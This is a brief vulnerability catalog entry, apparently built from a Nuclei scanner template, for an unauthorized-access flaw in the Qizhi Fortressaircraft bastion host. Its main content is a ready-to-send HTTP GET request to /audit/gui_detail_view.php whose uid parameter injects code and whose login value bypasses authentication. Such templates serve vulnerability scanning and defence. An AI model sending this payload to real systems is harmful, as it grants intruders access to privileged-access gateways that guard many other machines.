# Vulnerability: Qizhi Fortressaircraft Unauthorized Access
**Classification:** QIZHI
**Source:** Nuclei Template (`qizhi-fortressaircraft-unauth.yaml`)

## Description
Qizhi Fortressaircraft is vulnerable to Unauthorized Access.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=shterm
```

